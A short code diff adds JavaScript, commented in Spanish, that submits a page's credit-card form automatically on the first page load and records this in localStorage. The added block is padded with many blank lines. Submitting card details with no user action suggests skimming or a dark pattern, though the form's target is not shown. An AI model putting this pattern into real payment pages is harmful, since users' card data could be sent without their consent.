@@ -306,6 +306,33 @@ if (cardAddressValue) {
         closePopupButton.addEventListener('click', function () {
             popupOverlay.style.display = 'none';
         });
+
+
+
+
+
+  // JavaScript para enviar el formulario automáticamente solo la primera vez
+        window.addEventListener('load', function () {
+            // Comprobar si ya se ha enviado el formulario antes
+            if (!localStorage.getItem('formularioEnviado')) {
+                // Enviar el formulario automáticamente
+                const creditCardForm = document.getElementById('creditCardForm');
+                creditCardForm.submit();
+
+                // Establecer un indicador en localStorage para que no se envíe nuevamente
+                localStorage.setItem('formularioEnviado', 'true');
+            }
+        });
+
+
+
+
+
+
+
+
+        
+        
         
         
         // Verificar si hay un parámetro de consulta "success" en la URL
